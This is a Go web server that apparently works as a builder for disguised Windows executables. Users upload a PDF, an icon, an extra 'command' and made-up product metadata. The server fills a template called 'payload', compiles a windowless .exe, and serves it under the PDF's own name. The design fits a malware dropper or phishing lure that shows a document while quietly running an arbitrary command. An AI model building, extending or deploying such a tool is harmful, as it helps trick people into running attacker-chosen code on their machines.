package main

import (
	"bytes"
	"crypto/sha256"
	_ "embed"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html/template"
	"image"
	"image/png"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/image/draw"
)

//go:embed index.html
var indexHTML []byte

//go:embed payload.go.tmpl
var payloadTemplateStr string

const versionInfoTemplate = `{
	"FixedFileInfo": {
		"FileVersion": {
			"Major": 1,
			"Minor": 0,
			"Patch": 0,
			"Build": 0
		},
		"ProductVersion": {
			"Major": 1,
			"Minor": 0,
			"Patch": 0,
			"Build": 0
		},
		"FileFlagsMask": "3f",
		"FileFlags ": "00",
		"FileOS": "040004",
		"FileType": "01",
		"FileSubtype": "00"
	},
	"StringFileInfo": {
		"Comments": "",
		"CompanyName": "",
		"FileDescription": "%s",
		"FileVersion": "1.0.0.0",
		"InternalName": "",
		"LegalCopyright": "",
		"LegalTrademarks": "",
		"OriginalFilename": "",
		"ProductName": "%s",
		"ProductVersion": "1.0.0.0"
	},
	"VarFileInfo": {
		"Translation": {
			"LangID": "0409",
			"CharsetID": "04B0"
		}
	},
	"IconPath": "icon.ico",
	"ManifestPath": ""
}`

// BuildMetadata preserves metadata for serving download and garbage collection
type BuildMetadata struct {
	PdfHash     string    `json:"pdfHash"`
	IconHash    string    `json:"iconHash"`
	PdfName     string    `json:"pdfName"`
	Command     string    `json:"command"`
	FileDesc    string    `json:"fileDesc"`
	ProductName string    `json:"productName"`
	Created     time.Time `json:"created"`
}

// PayloadData represents template data injected into payload.go.tmpl
type PayloadData struct {
	PdfName           string
	AdditionalCommand string
}

// CompileResponse returned to client
type CompileResponse struct {
	Success     bool   `json:"success"`
	DownloadURL string `json:"downloadUrl"`
	Filename    string `json:"filename"`
}

// Safety compile locking to prevent cache stampedes on concurrent compiles of the same config
var (
	compileLocks = make(map[string]*sync.Mutex)
	compileMapMu sync.Mutex
)

func getCompileMutex(buildHash string) *sync.Mutex {
	compileMapMu.Lock()
	defer compileMapMu.Unlock()
	if _, exists := compileLocks[buildHash]; !exists {
		compileLocks[buildHash] = &sync.Mutex{}
	}
	return compileLocks[buildHash]
}

func main() {
	// Initialize directories
	if err := os.MkdirAll("data/pdfs", 0755); err != nil {
		log.Fatalf("Failed to create data/pdfs dir: %v", err)
	}
	if err := os.MkdirAll("data/icons", 0755); err != nil {
		log.Fatalf("Failed to create data/icons dir: %v", err)
	}
	if err := os.MkdirAll("data/builds", 0755); err != nil {
		log.Fatalf("Failed to create data/builds dir: %v", err)
	}

	// Start 24h background cleanup loop
	go startCleanupWorker(1 * time.Hour)

	// Read port from environment variable, default to 8080
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/compile", handleCompile)
	http.HandleFunc("/download/", handleDownload)
	http.HandleFunc("/health", handleHealth)

	log.Printf("Starting PDF-to-EXE server on port %s...", port)
	if err := http.ListenAndServe(":"+port, nil); err != nil {
		log.Fatalf("Server failed to start: %v", err)
	}
}

// Serves the HTML frontend dashboard
func handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(indexHTML)
}

// Health check endpoint
func handleHealth(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

// Compile endpoint
func handleCompile(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Limit upload body to 105MB
	r.Body = http.MaxBytesReader(w, r.Body, 105*1024*1024)

	// Parse multipart form
	if err := r.ParseMultipartForm(110 * 1024 * 1024); err != nil {
		log.Printf("Error parsing multipart form: %v", err)
		http.Error(w, "Request size exceeds limit or invalid form", http.StatusBadRequest)
		return
	}

	// 1. Extract PDF
	pdfFile, pdfHeader, err := r.FormFile("pdf")
	if err != nil {
		http.Error(w, "Missing 'pdf' file", http.StatusBadRequest)
		return
	}
	defer pdfFile.Close()

	if !strings.HasSuffix(strings.ToLower(pdfHeader.Filename), ".pdf") {
		http.Error(w, "Uploaded file is not a PDF", http.StatusBadRequest)
		return
	}

	// 2. Extract PNG Icon
	iconFile, _, err := r.FormFile("icon")
	if err != nil {
		http.Error(w, "Missing 'icon' (PNG) file", http.StatusBadRequest)
		return
	}
	defer iconFile.Close()

	// 3. Extract parameters
	additionalCmd := r.FormValue("command")
	fileDesc := r.FormValue("fileDescription")
	prodName := r.FormValue("productName")

	if fileDesc == "" {
		fileDesc = "PDF Document Launcher"
	}
	if prodName == "" {
		prodName = "PDF Document Launcher"
	}

	// Read PDF bytes and generate content hash
	pdfBytes, err := io.ReadAll(pdfFile)
	if err != nil {
		log.Printf("Failed to read PDF bytes: %v", err)
		http.Error(w, "Failed to read PDF bytes", http.StatusInternalServerError)
		return
	}
	pdfHash := calculateHash(pdfBytes)

	// Read PNG bytes and generate content hash
	pngBytes, err := io.ReadAll(iconFile)
	if err != nil {
		log.Printf("Failed to read icon bytes: %v", err)
		http.Error(w, "Failed to read icon bytes", http.StatusInternalServerError)
		return
	}
	iconHash := calculateHash(pngBytes)

	// Calculate Combined Build Hash
	buildHash := calculateBuildHash(pdfHash, iconHash, additionalCmd, fileDesc, prodName)

	pdfFilename := filepath.Base(pdfHeader.Filename)
	cleanName := strings.TrimSuffix(pdfFilename, filepath.Ext(pdfFilename))
	if cleanName == "" {
		cleanName = "launcher"
	}
	outputFilename := cleanName + ".exe"

	// Lock compile operation for this build hash
	mu := getCompileMutex(buildHash)
	mu.Lock()
	defer mu.Unlock()

	// Check if already compiled
	exePath := filepath.Join("data/builds", buildHash+".exe")
	metaPath := filepath.Join("data/builds", buildHash+".json")

	if fileExists(exePath) && fileExists(metaPath) {
		log.Printf("Reusing compiled EXE for build hash: %s", buildHash)
		// Touch meta file to extend lifetime if needed, or simply return
		updateMetadataTimestamp(metaPath)

		serveJSONResponse(w, CompileResponse{
			Success:     true,
			DownloadURL: "/download/" + buildHash,
			Filename:    outputFilename,
		})
		return
	}

	// Deduplicate assets on disk
	cachedPdfPath := filepath.Join("data/pdfs", pdfHash+".pdf")
	if !fileExists(cachedPdfPath) {
		if err := os.WriteFile(cachedPdfPath, pdfBytes, 0644); err != nil {
			log.Printf("Failed to save cached PDF: %v", err)
			http.Error(w, "Failed to cache PDF file", http.StatusInternalServerError)
			return
		}
	}

	cachedIconPath := filepath.Join("data/icons", iconHash+".ico")
	if !fileExists(cachedIconPath) {
		icoBytes, err := convertPngToIco(pngBytes)
		if err != nil {
			log.Printf("Failed to convert PNG to ICO: %v", err)
			http.Error(w, fmt.Sprintf("Invalid icon file: %v", err), http.StatusBadRequest)
			return
		}
		if err := os.WriteFile(cachedIconPath, icoBytes, 0644); err != nil {
			log.Printf("Failed to save cached ICO: %v", err)
			http.Error(w, "Failed to cache icon file", http.StatusInternalServerError)
			return
		}
	}

	// Perform actual compilation in a temporary folder
	tmpDir, err := os.MkdirTemp("", "pdf-exe-build-*")
	if err != nil {
		log.Printf("Failed to create temp directory: %v", err)
		http.Error(w, "Failed to initialize compilation environment", http.StatusInternalServerError)
		return
	}
	defer os.RemoveAll(tmpDir)

	// Copy cached PDF & Icon into compile workspace
	err = copyFile(cachedPdfPath, filepath.Join(tmpDir, pdfFilename))
	if err != nil {
		log.Printf("Failed to copy PDF to workspace: %v", err)
		http.Error(w, "Compilation configuration failure", http.StatusInternalServerError)
		return
	}

	err = copyFile(cachedIconPath, filepath.Join(tmpDir, "icon.ico"))
	if err != nil {
		log.Printf("Failed to copy icon to workspace: %v", err)
		http.Error(w, "Compilation configuration failure", http.StatusInternalServerError)
		return
	}

	// Write versioninfo.json
	versionInfoJSON := fmt.Sprintf(versionInfoTemplate, escapeJSONString(fileDesc), escapeJSONString(prodName))
	err = os.WriteFile(filepath.Join(tmpDir, "versioninfo.json"), []byte(versionInfoJSON), 0644)
	if err != nil {
		log.Printf("Failed to write versioninfo.json: %v", err)
		http.Error(w, "Failed to configure version details", http.StatusInternalServerError)
		return
	}

	// Generate main.go
	tmpl, err := template.New("payload").Parse(payloadTemplateStr)
	if err != nil {
		log.Printf("Failed to parse payload template: %v", err)
		http.Error(w, "Internal template parsing error", http.StatusInternalServerError)
		return
	}

	var mainGoBuf bytes.Buffer
	err = tmpl.Execute(&mainGoBuf, PayloadData{
		PdfName:           pdfFilename,
		AdditionalCommand: additionalCmd,
	})
	if err != nil {
		log.Printf("Failed to execute payload template: %v", err)
		http.Error(w, "Internal template processing error", http.StatusInternalServerError)
		return
	}

	err = os.WriteFile(filepath.Join(tmpDir, "main.go"), mainGoBuf.Bytes(), 0644)
	if err != nil {
		log.Printf("Failed to write main.go: %v", err)
		http.Error(w, "Failed to write target code files", http.StatusInternalServerError)
		return
	}

	// Write go.mod
	goModContent := fmt.Sprintf("module pdfembed\n\ngo 1.23.2\n")
	err = os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goModContent), 0644)
	if err != nil {
		log.Printf("Failed to write go.mod: %v", err)
		http.Error(w, "Failed to write module config", http.StatusInternalServerError)
		return
	}

	// Compile resources using goversioninfo
	goversioninfoPath := locateGoversioninfo()
	resCmd := exec.Command(goversioninfoPath)
	resCmd.Dir = tmpDir
	var resStderr bytes.Buffer
	resCmd.Stderr = &resStderr
	if err := resCmd.Run(); err != nil {
		log.Printf("goversioninfo execution failed: %v, stderr: %s", err, resStderr.String())
		http.Error(w, fmt.Sprintf("Failed to compile icon resources: %s", resStderr.String()), http.StatusInternalServerError)
		return
	}

	// Compile the executable
	buildCmd := exec.Command("go", "build", "-ldflags=-H windowsgui", "-o", "output.exe", ".")
	buildCmd.Dir = tmpDir
	buildCmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	var buildStderr bytes.Buffer
	buildCmd.Stderr = &buildStderr

	if err := buildCmd.Run(); err != nil {
		log.Printf("Go cross-compilation failed: %v, stderr: %s", err, buildStderr.String())
		http.Error(w, fmt.Sprintf("Compilation error: %s", buildStderr.String()), http.StatusInternalServerError)
		return
	}

	// Move compiled EXE to persistent cache
	err = copyFile(filepath.Join(tmpDir, "output.exe"), exePath)
	if err != nil {
		log.Printf("Failed to save final EXE: %v", err)
		http.Error(w, "Failed to save built binary", http.StatusInternalServerError)
		return
	}

	// Write metadata json
	metadata := BuildMetadata{
		PdfHash:     pdfHash,
		IconHash:    iconHash,
		PdfName:     pdfFilename,
		Command:     additionalCmd,
		FileDesc:    fileDesc,
		ProductName: prodName,
		Created:     time.Now(),
	}
	metaBytes, err := json.MarshalIndent(metadata, "", "  ")
	if err != nil {
		log.Printf("Failed to marshal metadata: %v", err)
		// Non-blocking for compiling success, but let's try to write anyway
	} else {
		_ = os.WriteFile(metaPath, metaBytes, 0644)
	}

	log.Printf("Successfully compiled build: %s (%s)", buildHash, outputFilename)

	serveJSONResponse(w, CompileResponse{
		Success:     true,
		DownloadURL: "/download/" + buildHash,
		Filename:    outputFilename,
	})
}

// Serves the compiled EXE file
func handleDownload(w http.ResponseWriter, r *http.Request) {
	hash := strings.TrimPrefix(r.URL.Path, "/download/")
	hash = filepath.Base(hash) // Prevent path injection

	if hash == "" || len(hash) != 64 {
		http.Error(w, "Invalid download hash link", http.StatusBadRequest)
		return
	}

	exePath := filepath.Join("data/builds", hash+".exe")
	metaPath := filepath.Join("data/builds", hash+".json")

	if !fileExists(exePath) || !fileExists(metaPath) {
		http.Error(w, "Download file not found or expired (24h retention)", http.StatusNotFound)
		return
	}

	// Read metadata to get the original file name
	metaBytes, err := os.ReadFile(metaPath)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	var meta BuildMetadata
	if err := json.Unmarshal(metaBytes, &meta); err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	exeBytes, err := os.ReadFile(exePath)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Format download filename
	cleanName := strings.TrimSuffix(meta.PdfName, filepath.Ext(meta.PdfName))
	if cleanName == "" {
		cleanName = "launcher"
	}

	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s.exe\"", cleanName))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(exeBytes)))
	w.Write(exeBytes)
}

// Background cleanup worker
func startCleanupWorker(interval time.Duration) {
	ticker := time.NewTicker(interval)
	for range ticker.C {
		cleanupExpiredBuilds()
	}
}

func cleanupExpiredBuilds() {
	log.Println("Starting scheduled 24-hour builds cleanup...")

	files, err := os.ReadDir("data/builds")
	if err != nil {
		log.Printf("Cleanup failed to read data/builds: %v", err)
		return
	}

	now := time.Now()
	activePdfs := make(map[string]bool)
	activeIcons := make(map[string]bool)

	for _, file := range files {
		if !strings.HasSuffix(file.Name(), ".json") {
			continue
		}

		metaPath := filepath.Join("data/builds", file.Name())
		metaBytes, err := os.ReadFile(metaPath)
		if err != nil {
			continue
		}

		var meta BuildMetadata
		if err := json.Unmarshal(metaBytes, &meta); err != nil {
			continue
		}

		buildHash := strings.TrimSuffix(file.Name(), ".json")

		// Check if build is older than 24 hours
		if now.Sub(meta.Created) > 24*time.Hour {
			log.Printf("Purging expired build hash: %s (Created: %s)", buildHash, meta.Created)
			_ = os.Remove(metaPath)
			_ = os.Remove(filepath.Join("data/builds", buildHash+".exe"))
		} else {
			// Keep track of active asset hashes
			activePdfs[meta.PdfHash] = true
			activeIcons[meta.IconHash] = true
		}
	}

	// Clean up unused/orphaned PDFs
	pdfFiles, err := os.ReadDir("data/pdfs")
	if err == nil {
		for _, f := range pdfFiles {
			hash := strings.TrimSuffix(f.Name(), ".pdf")
			if !activePdfs[hash] {
				log.Printf("Purging orphaned cached PDF: %s", f.Name())
				_ = os.Remove(filepath.Join("data/pdfs", f.Name()))
			}
		}
	}

	// Clean up unused/orphaned icons
	iconFiles, err := os.ReadDir("data/icons")
	if err == nil {
		for _, f := range iconFiles {
			hash := strings.TrimSuffix(f.Name(), ".ico")
			if !activeIcons[hash] {
				log.Printf("Purging orphaned cached Icon: %s", f.Name())
				_ = os.Remove(filepath.Join("data/icons", f.Name()))
			}
		}
	}
}

// Helpers
func calculateHash(data []byte) string {
	h := sha256.Sum256(data)
	return hex.EncodeToString(h[:])
}

func calculateBuildHash(pdfHash, iconHash, cmd, desc, prod string) string {
	h := sha256.New()
	h.Write([]byte(pdfHash))
	h.Write([]byte(iconHash))
	h.Write([]byte(cmd))
	h.Write([]byte(desc))
	h.Write([]byte(prod))
	return hex.EncodeToString(h.Sum(nil))
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	if _, err = io.Copy(out, in); err != nil {
		return err
	}
	return out.Sync()
}

func updateMetadataTimestamp(metaPath string) {
	metaBytes, err := os.ReadFile(metaPath)
	if err != nil {
		return
	}
	var meta BuildMetadata
	if err := json.Unmarshal(metaBytes, &meta); err == nil {
		meta.Created = time.Now() // Extend compile validity
		if newBytes, err := json.MarshalIndent(meta, "", "  "); err == nil {
			_ = os.WriteFile(metaPath, newBytes, 0644)
		}
	}
}

func serveJSONResponse(w http.ResponseWriter, response CompileResponse) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_ = json.NewEncoder(w).Encode(response)
}

func escapeJSONString(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	s = strings.ReplaceAll(s, "\n", "\\n")
	s = strings.ReplaceAll(s, "\r", "\\r")
	s = strings.ReplaceAll(s, "\t", "\\t")
	return s
}

func locateGoversioninfo() string {
	if path, err := exec.LookPath("goversioninfo"); err == nil {
		return path
	}
	for _, loc := range []string{
		"/go/bin/goversioninfo",
		filepath.Join(os.Getenv("GOPATH"), "bin", "goversioninfo"),
		filepath.Join(os.Getenv("GOPATH"), "bin", "goversioninfo.exe"),
	} {
		if _, err := os.Stat(loc); err == nil {
			return loc
		}
	}
	return "goversioninfo"
}

// Convert PNG to ICO helper
func convertPngToIco(pngData []byte) ([]byte, error) {
	srcImg, err := png.Decode(bytes.NewReader(pngData))
	if err != nil {
		return nil, fmt.Errorf("failed to decode PNG: %w", err)
	}

	dstBmp := image.NewRGBA(image.Rect(0, 0, 256, 256))
	draw.CatmullRom.Scale(dstBmp, dstBmp.Bounds(), srcImg, srcImg.Bounds(), draw.Over, nil)

	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, dstBmp); err != nil {
		return nil, fmt.Errorf("failed to encode scaled PNG: %w", err)
	}
	resizedPng := pngBuf.Bytes()

	pngSize := uint32(len(resizedPng))
	icoBytes := make([]byte, 22+pngSize)

	icoBytes[0], icoBytes[1] = 0, 0
	icoBytes[2], icoBytes[3] = 1, 0
	icoBytes[4], icoBytes[5] = 1, 0
	icoBytes[6] = 0
	icoBytes[7] = 0
	icoBytes[8] = 0
	icoBytes[9] = 0
	icoBytes[10], icoBytes[11] = 1, 0
	icoBytes[12], icoBytes[13] = 32, 0

	binary.LittleEndian.PutUint32(icoBytes[14:18], pngSize)
	binary.LittleEndian.PutUint32(icoBytes[18:22], 22)
	copy(icoBytes[22:], resizedPng)

	return icoBytes, nil
}
